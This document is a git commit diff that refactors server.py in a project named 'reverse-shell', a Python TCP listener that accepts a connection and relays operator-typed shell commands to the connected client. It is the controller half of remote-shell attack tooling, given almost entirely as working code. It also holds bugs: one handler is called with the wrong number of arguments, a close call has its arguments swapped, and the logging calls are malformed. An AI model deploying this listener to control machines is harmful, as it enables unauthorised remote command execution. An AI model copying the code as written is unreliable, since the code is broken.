71b613ee816365905dedb1f58048443fe276f35c
Mahboob-A <iammahboob.a@gmail.com>
2024-03-24 12:28:52 +0530

    revised and refactored the server

--- reverse-shell/server.py
+++ reverse-shell/server.py
@@ -1,90 +1,133 @@
 import socket 
 import sys 
+import logging
+
+from config import HOST, PORT
 
 
 def create_socket(): 
-        ''' Create a socket object '''
-        try: 
-                global host
-                global port 
-                global s 
-                
-                host = ''
-                port = 12345
-                
-                s = socket.socket()
-                print('socket creation successful!\n')
-                
+        ''' Creates a socket object. '''
+        try:     
+                # TCP connection 
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                logging.info('socket creation successful!')
+                return sock             
         except socket.error as err: 
-                print('Socket creation error - ', err)
+                logging.error('Socket creation error:  ', err)
+                sys.exit(1)
 
-def bind_socket(): 
-        ''' Bind to host and port '''
+
+def bind_socket(sock): 
+    """Binds the socket to the specified host and port."""
+    try:
+        # binding and listening to at most 2 connections
+        sock.bind((HOST, PORT))
+        sock.listen(2)
+        logging.info(
+                f"server is listening in host:  {'open-to-all' if HOST == '' else HOST} and port:  {PORT}"
+        )
+    except socket.error as err:
+        logging.error("Socket binding error:  ", err)
+        logging.info('Retrying to bind socket...')
+        # call the helper function to retry to bind the socket. 
+        retry_bind_socket_helper(sock)
+
+
+def retry_bind_socket(sock):
+    """Retries to bind the socket to the specified host and port."""
+    try:
+        # binding and listening to at most 2 connections
+        sock.bind((HOST, PORT))
+        sock.listen(2)
+        logging.info(
+            f"server is listening in host:  {'open-to-all' if HOST == '' else HOST} and port:  {PORT}"
+        )
+        return True 
+    except socket.error as err:
+        logging.error("Socket binding error:  ", err)
+        logging.info("Retrying to bind socket...")
+        return False 
+
+
+def retry_bind_socket_helper(sock):
+    '''Helper function to retury to bind to the speific HOST and PORT for 5 times. ''' 
+    retry = 5
+    
+    while retry >= 0: 
+        result = retry_bind_socket(sock)
+        if not result:
+                retry -= 1
+        else: 
+                break
+
+    if retry == 0:
+        logging.error("Failed to bind to connection!")
+        logging.info("Retried to bind the socket upto 5 times")
+
+
+def accept_socket(sock): 
+        ''' Accepts a connection from a client. '''
         try: 
-                global host 
-                global port 
-                global s 
-                
-                s.bind((host, port))
-                
-                # listening to at most 2 connections 
-                s.listen(2)
-                print(f"server is listening in host - {'open-to-all' if host == '' else host} and port - {port}")
-                
-        except socket.error as err: 
-                print('Socket binding error - ', err, '\n', 'Reconnecting...')
-                bind_socket()
-
-def accept_socket(): 
-        ''' Accept the connection '''
-        try: 
-                global host 
-                global port 
-                global s 
-
-                conn, addr = s.accept()
-
-                print(f"Connected to address - {addr[0]} and port - {addr[1]}")
-
-                # send commands. passing connection and socket object 
-                send_commands(conn, s)
-                
-                # close the connection and socket after the commads are sent 
-                conn.close()
-                s.close()
-
-
+                conn, addr = sock.accept()
+                logging.info(f"Connected to address:  {addr[0]} and port:  {addr[1]}")
+                return conn, addr
         except socket.error as err:
-                print("Error accepting the connection - ", err)
+                logging.error("Error accepting the connection: ", err)
 
 
-def send_commands(conn, s): 
-        ''' Send commands to clinet '''
-        
-        print("Send Commands to Client... ")
+def commands_handler(conn, s): 
+    """Sends commands to the clinet. """
+    logging.info("Sending commands to client... ")
+    while True:
+        command = input("Enter command ('q' to exit)...   ")
+        if command.strip() == "":
+            print("Command can not be empty. please try again.")
+            continue
+        if command == "q":
+            break
 
-        while True:
-                inp = input("Enter command ('q' to exit)...   ")
-                if inp == "q":
-                        conn.close()
-                        s.close()
-                        # close the terminal
-                        sys.exit()
+        encoded_command = command.encode("utf-8")
+        if len(encoded_command) > 0:
+            conn.send(encoded_command)
+            data = conn.recv(1024).decode("utf-8")  # str(conn.recv(1024), 'utf-8')
+            print(data, end="")
 
-                encoded_inp = inp.encode()
 
-                if len(encoded_inp) > 0:
-                        conn.send(encoded_inp)
-                        data = str(conn.recv(1024), 'utf-8')  # same as decoding decode() takes 'utf-8' by default data = conn.recv(1024).decode()
-                        print(data, end=" ")
-
+def close_connection(sock, conn=None):
+    """Closes the connection and the socket."""
+    if conn: 
+        conn.close()
+        sock.close()
+        logging.info("Server is shutdown!")
+        sys.exit(0)
+    else: 
+        sock.close()
+        logging.info("Server is shutdown!")
+        sys.exit(0)
 
 def main(): 
-        print('Starting Socket...')
-        create_socket()
-        bind_socket()
-        accept_socket()
+        logging.basicConfig(level=logging.INFO)
+        logging.info('Starting server...')
+        
+        # Create and bind the socket 
+        sock = create_socket()
+        bind_socket(sock)
+        conn = None 
+        try: 
+                conn, addr = accept_socket(sock=sock)
+                commands_handler(conn)
+                # close the connection and the socket as the user pressed 'q' 
+                close_connection(sock, conn)
+        except KeyboardInterrupt: 
+                logging.info('Server shutdown initiated by user.')
+                # close the connection and the socket as the user pressed 'ctrl-c'
+                # if server is stopped as ctrl-c before any connection has established, 
+                # then conn will be unavailable. 
+                if conn is not None: 
+                        close_connection(conn, sock)
+                else: 
+                        close_connection(sock)
 
 
-# calling main function
-main()
+if __name__ == '__main__': 
+        main()
